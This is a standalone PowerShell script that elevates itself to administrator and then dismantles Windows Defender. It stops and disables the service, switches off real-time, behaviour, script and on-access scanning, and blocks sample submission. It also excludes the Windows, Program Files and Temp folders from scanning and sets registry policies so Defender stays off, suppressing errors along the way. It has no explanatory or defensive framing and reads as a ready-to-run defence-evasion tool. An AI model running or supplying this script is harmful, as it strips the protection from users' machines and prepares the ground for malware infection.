# Elevate to admin without UAC bypass (requires user consent)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

# Main protection removal logic
try {
    # Disable Windows Defender services
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue

    # Modify Defender preferences
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

    # Add exclusions to critical paths
    Add-MpPreference -ExclusionPath "$env:windir" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:programfiles" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:temp" -ErrorAction SilentlyContinue

    # Disable Windows Defender features via registry
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f

    Write-Host "Defender disabled. System may require reboot." -ForegroundColor Red
}
catch {
    Write-Host "Error during execution: $_" -ForegroundColor Yellow
}
